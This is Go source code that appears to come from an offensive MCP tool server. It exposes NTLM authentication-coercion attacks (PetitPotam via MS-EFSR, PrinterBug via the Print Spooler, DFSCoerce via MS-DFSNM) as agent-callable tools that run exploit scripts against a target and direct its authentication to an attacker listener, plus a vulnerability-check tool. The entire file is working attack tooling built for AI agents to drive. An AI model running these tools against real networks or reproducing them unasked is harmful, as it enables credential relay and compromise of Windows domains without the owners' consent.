package coercion

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// --- PetitPotamTool ---

type PetitPotamInput struct {
	Target   string `json:"target"`
	Listener string `json:"listener"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
	Domain   string `json:"domain,omitempty"`
	Pipe     string `json:"pipe,omitempty"`
}

type PetitPotamTool struct {
	exec executor.Executor
}

func NewPetitPotam(exec executor.Executor) *PetitPotamTool {
	return &PetitPotamTool{exec: exec}
}

func (t *PetitPotamTool) Name() string { return "coercion_petitpotam" }

func (t *PetitPotamTool) Description() string {
	return "NTLM relay via MS-EFSR abuse (PetitPotam). Coerces authentication from a target domain controller to an attacker-controlled listener using the Encrypting File System Remote protocol."
}

func (t *PetitPotamTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target": {
				"type": "string",
				"description": "Target domain controller IP or hostname"
			},
			"listener": {
				"type": "string",
				"description": "Attacker listener IP address"
			},
			"username": {
				"type": "string",
				"description": "Username for authentication (optional for unauthenticated)"
			},
			"password": {
				"type": "string",
				"description": "Password for authentication"
			},
			"domain": {
				"type": "string",
				"description": "Target domain"
			},
			"pipe": {
				"type": "string",
				"enum": ["efsr", "lsarpc", "samr", "netlogon"],
				"description": "Named pipe to use for coercion"
			}
		},
		"required": ["target", "listener"]
	}`)
}

func (t *PetitPotamTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input PetitPotamInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateInput(input.Target); err != nil {
		return errorResult("target: " + err.Error()), nil
	}
	if err := validateInput(input.Listener); err != nil {
		return errorResult("listener: " + err.Error()), nil
	}
	if input.Username != "" {
		if err := validateInput(input.Username); err != nil {
			return errorResult("username: " + err.Error()), nil
		}
	}
	if input.Password != "" {
		if err := validateInput(input.Password); err != nil {
			return errorResult("password: " + err.Error()), nil
		}
	}
	if input.Domain != "" {
		if err := validateInput(input.Domain); err != nil {
			return errorResult("domain: " + err.Error()), nil
		}
	}

	args := []string{"/opt/PetitPotam/PetitPotam.py"}
	if input.Username != "" {
		args = append(args, "-u", input.Username)
	}
	if input.Password != "" {
		args = append(args, "-p", input.Password)
	}
	if input.Domain != "" {
		args = append(args, "-d", input.Domain)
	}
	if input.Pipe != "" {
		args = append(args, "-pipe", input.Pipe)
	}
	args = append(args, input.Listener, input.Target)

	result, err := t.exec.Run(ctx, "python3", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("PetitPotam failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## PetitPotam Coercion\n\n")
	fmt.Fprintf(&sb, "**Target**: %s | **Listener**: %s\n\n", input.Target, input.Listener)
	if output == "" {
		sb.WriteString("Coercion attempt completed (no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// --- PrinterBugTool ---

type PrinterBugInput struct {
	Target   string `json:"target"`
	Listener string `json:"listener"`
	Username string `json:"username"`
	Password string `json:"password"`
	Domain   string `json:"domain,omitempty"`
}

type PrinterBugTool struct {
	exec executor.Executor
}

func NewPrinterBug(exec executor.Executor) *PrinterBugTool {
	return &PrinterBugTool{exec: exec}
}

func (t *PrinterBugTool) Name() string { return "coercion_printerbug" }

func (t *PrinterBugTool) Description() string {
	return "SpoolService abuse for NTLM relay (PrinterBug/Dementor). Coerces a target machine to authenticate back to an attacker-controlled listener via the Print Spooler service."
}

func (t *PrinterBugTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target": {
				"type": "string",
				"description": "Target machine IP or hostname"
			},
			"listener": {
				"type": "string",
				"description": "Attacker listener IP address"
			},
			"username": {
				"type": "string",
				"description": "Username for authentication"
			},
			"password": {
				"type": "string",
				"description": "Password for authentication"
			},
			"domain": {
				"type": "string",
				"description": "Target domain"
			}
		},
		"required": ["target", "listener", "username", "password"]
	}`)
}

func (t *PrinterBugTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input PrinterBugInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateInput(input.Target); err != nil {
		return errorResult("target: " + err.Error()), nil
	}
	if err := validateInput(input.Listener); err != nil {
		return errorResult("listener: " + err.Error()), nil
	}
	if err := validateInput(input.Username); err != nil {
		return errorResult("username: " + err.Error()), nil
	}
	if err := validateInput(input.Password); err != nil {
		return errorResult("password: " + err.Error()), nil
	}
	if input.Domain != "" {
		if err := validateInput(input.Domain); err != nil {
			return errorResult("domain: " + err.Error()), nil
		}
	}

	args := []string{"/opt/dementor/dementor.py"}
	if input.Domain != "" {
		args = append(args, "-d", input.Domain)
	}
	args = append(args, "-u", input.Username)
	args = append(args, "-p", input.Password)
	args = append(args, input.Listener, input.Target)

	result, err := t.exec.Run(ctx, "python3", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("PrinterBug failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## PrinterBug Coercion\n\n")
	fmt.Fprintf(&sb, "**Target**: %s | **Listener**: %s\n\n", input.Target, input.Listener)
	if output == "" {
		sb.WriteString("Coercion attempt completed (no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// --- DFSCoerceTool ---

type DFSCoerceInput struct {
	Target   string `json:"target"`
	Listener string `json:"listener"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
	Domain   string `json:"domain,omitempty"`
}

type DFSCoerceTool struct {
	exec executor.Executor
}

func NewDFSCoerce(exec executor.Executor) *DFSCoerceTool {
	return &DFSCoerceTool{exec: exec}
}

func (t *DFSCoerceTool) Name() string { return "coercion_dfscoerce" }

func (t *DFSCoerceTool) Description() string {
	return "DFS coercion attack. Abuses the Distributed File System (MS-DFSNM) to coerce NTLM authentication from a target to an attacker-controlled listener."
}

func (t *DFSCoerceTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target": {
				"type": "string",
				"description": "Target machine IP or hostname"
			},
			"listener": {
				"type": "string",
				"description": "Attacker listener IP address"
			},
			"username": {
				"type": "string",
				"description": "Username for authentication"
			},
			"password": {
				"type": "string",
				"description": "Password for authentication"
			},
			"domain": {
				"type": "string",
				"description": "Target domain"
			}
		},
		"required": ["target", "listener"]
	}`)
}

func (t *DFSCoerceTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DFSCoerceInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateInput(input.Target); err != nil {
		return errorResult("target: " + err.Error()), nil
	}
	if err := validateInput(input.Listener); err != nil {
		return errorResult("listener: " + err.Error()), nil
	}
	if input.Username != "" {
		if err := validateInput(input.Username); err != nil {
			return errorResult("username: " + err.Error()), nil
		}
	}
	if input.Password != "" {
		if err := validateInput(input.Password); err != nil {
			return errorResult("password: " + err.Error()), nil
		}
	}
	if input.Domain != "" {
		if err := validateInput(input.Domain); err != nil {
			return errorResult("domain: " + err.Error()), nil
		}
	}

	args := []string{"/opt/DFSCoerce/dfscoerce.py"}
	if input.Domain != "" {
		args = append(args, "-d", input.Domain)
	}
	if input.Username != "" {
		args = append(args, "-u", input.Username)
	}
	if input.Password != "" {
		args = append(args, "-p", input.Password)
	}
	args = append(args, input.Listener, input.Target)

	result, err := t.exec.Run(ctx, "python3", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("DFSCoerce failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## DFSCoerce Coercion\n\n")
	fmt.Fprintf(&sb, "**Target**: %s | **Listener**: %s\n\n", input.Target, input.Listener)
	if output == "" {
		sb.WriteString("Coercion attempt completed (no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// --- CheckTool ---

type CheckInput struct {
	Target   string `json:"target"`
	Method   string `json:"method,omitempty"`
	Username string `json:"username,omitempty"`
	Password string `json:"password,omitempty"`
	Domain   string `json:"domain,omitempty"`
}

type CheckTool struct {
	exec executor.Executor
}

func NewCheck(exec executor.Executor) *CheckTool {
	return &CheckTool{exec: exec}
}

func (t *CheckTool) Name() string { return "coercion_check" }

func (t *CheckTool) Description() string {
	return "Check if a target is vulnerable to authentication coercion without triggering exploitation. Supports PetitPotam, PrinterBug, and DFSCoerce methods."
}

func (t *CheckTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target": {
				"type": "string",
				"description": "Target machine IP or hostname"
			},
			"method": {
				"type": "string",
				"enum": ["petitpotam", "printerbug", "dfscoerce", "all"],
				"description": "Coercion method to check (default: all)"
			},
			"username": {
				"type": "string",
				"description": "Username for authentication"
			},
			"password": {
				"type": "string",
				"description": "Password for authentication"
			},
			"domain": {
				"type": "string",
				"description": "Target domain"
			}
		},
		"required": ["target"]
	}`)
}

func (t *CheckTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CheckInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateInput(input.Target); err != nil {
		return errorResult("target: " + err.Error()), nil
	}
	if input.Username != "" {
		if err := validateInput(input.Username); err != nil {
			return errorResult("username: " + err.Error()), nil
		}
	}
	if input.Password != "" {
		if err := validateInput(input.Password); err != nil {
			return errorResult("password: " + err.Error()), nil
		}
	}
	if input.Domain != "" {
		if err := validateInput(input.Domain); err != nil {
			return errorResult("domain: " + err.Error()), nil
		}
	}

	method := input.Method
	if method == "" {
		method = "all"
	}

	var sb strings.Builder
	sb.WriteString("## Coercion Vulnerability Check\n\n")
	fmt.Fprintf(&sb, "**Target**: %s | **Method**: %s\n\n", input.Target, method)

	methods := []string{method}
	if method == "all" {
		methods = []string{"petitpotam", "printerbug", "dfscoerce"}
	}

	for _, m := range methods {
		var args []string
		switch m {
		case "petitpotam":
			args = []string{"/opt/PetitPotam/PetitPotam.py", "-check"}
			if input.Username != "" {
				args = append(args, "-u", input.Username)
			}
			if input.Password != "" {
				args = append(args, "-p", input.Password)
			}
			if input.Domain != "" {
				args = append(args, "-d", input.Domain)
			}
			args = append(args, "127.0.0.1", input.Target)
		case "printerbug":
			args = []string{"/opt/dementor/dementor.py", "-check"}
			if input.Username != "" {
				args = append(args, "-u", input.Username)
			}
			if input.Password != "" {
				args = append(args, "-p", input.Password)
			}
			if input.Domain != "" {
				args = append(args, "-d", input.Domain)
			}
			args = append(args, "127.0.0.1", input.Target)
		case "dfscoerce":
			args = []string{"/opt/DFSCoerce/dfscoerce.py", "-check"}
			if input.Username != "" {
				args = append(args, "-u", input.Username)
			}
			if input.Password != "" {
				args = append(args, "-p", input.Password)
			}
			if input.Domain != "" {
				args = append(args, "-d", input.Domain)
			}
			args = append(args, "127.0.0.1", input.Target)
		default:
			return errorResult(fmt.Sprintf("unknown method: %s", m)), nil
		}

		result, err := t.exec.Run(ctx, "python3", args...)
		if err != nil {
			stderr := ""
			if result != nil {
				stderr = string(result.Stderr)
			}
			fmt.Fprintf(&sb, "### %s: ERROR\n\n```\n%s\n%s\n```\n\n", m, err.Error(), stderr)
			continue
		}

		output := strings.TrimSpace(string(result.Stdout))
		if output == "" {
			fmt.Fprintf(&sb, "### %s: No output (likely not vulnerable)\n\n", m)
		} else {
			fmt.Fprintf(&sb, "### %s\n\n```\n%s\n```\n\n", m, output)
		}
	}

	return textResult(sb.String()), nil
}
